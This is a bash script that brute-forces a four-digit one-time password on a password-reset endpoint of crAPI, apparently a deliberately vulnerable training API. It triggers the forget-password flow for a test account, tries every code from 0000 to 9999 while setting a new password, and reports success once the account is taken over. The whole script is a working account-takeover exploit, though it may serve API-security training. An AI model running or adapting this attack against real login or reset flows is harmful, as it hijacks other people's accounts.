#!/bin/bash

FPWD_URL="http://crapi.apisec.ai/identity/api/auth/forget-password"
OTP_URL="http://crapi.apisec.ai/identity/api/auth/v2/check-otp"
EMAIL="test@acme.com"
NEW_PWD="Passme123"

# First need to API to generate the OTP on a forget password event
RESULT=$(curl $FPWD_URL \
        -H 'Content-Type: application/json' \
        --data-raw "{\"email\":\"$EMAIL\"}" \
        --insecure -s)

for OTP in {0000..9999}; do
    RESULT=$(curl $OTP_URL \
             -H 'Content-Type: application/json' \
            --data-raw "{\"email\":\"$EMAIL\",\"otp\":\"$OTP\", \"password\":\"$NEW_PWD\"}" \
            --insecure -s| jq -j .status)
    if [[ "200" == $RESULT ]]; then
        echo "Bruteforced OTP ($OTP). Password for $EMAIL reset to $NEW_PWD."
        break
    fi
done
